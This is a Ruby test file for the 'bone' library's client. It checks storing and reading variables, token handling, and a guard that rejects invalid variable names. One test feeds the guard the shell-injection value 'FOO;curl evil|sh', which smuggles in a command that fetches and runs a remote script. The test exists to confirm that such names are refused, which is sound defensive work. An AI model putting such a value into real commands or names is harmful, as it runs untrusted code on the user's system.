# try/40_client_try.rb

require 'bone'

Bone::Backends::Memory.reset!
Bone.source = 'memory://localhost'
@token, @secret = *Bone.generate

## Bone.new returns a Client
Bone.new(@token, @secret).class
#=> Bone::Client

## Client is bound to its token
@client = Bone.new(@token, @secret)
@client.token
#=> @token

## Client set returns the stored string
@client.set(:nerve, :centre)
#=> 'centre'

## Client get reads it back
@client.get(:nerve)
#=> 'centre'

## Index accessors work
@client[:nasty] = :fine
@client[:nasty]
#=> 'fine'

## to_h returns all variables
@client.to_h
#=> {'nerve' => 'centre', 'nasty' => 'fine'}

## A client with no token raises on use
begin
  Bone::Client.new.get(:x)
  false
rescue Bone::NoToken
  true
end
#=> true

# -- F1/F2: write-boundary name validation --------------------------------
# Client#set is the choke point; it rejects any name that is not a valid
# shell/env identifier before it can reach the store (and later `export`).

## set rejects a shell-injecting name with InvalidName
begin
  @client.set('FOO;curl evil|sh', 'x')
  false
rescue Bone::InvalidName
  true
end
#=> true

## index-assign rejects a hyphenated (non-identifier) name
begin
  @client['a-b'] = 'v'
  false
rescue Bone::InvalidName
  true
end
#=> true

## a valid name still round-trips after the guard
@client.set('VALID_1', 'ok')
@client['VALID_1']
#=> 'ok'

## the rejected names were never stored
@client.keys.sort
#=> ['VALID_1', 'nasty', 'nerve']
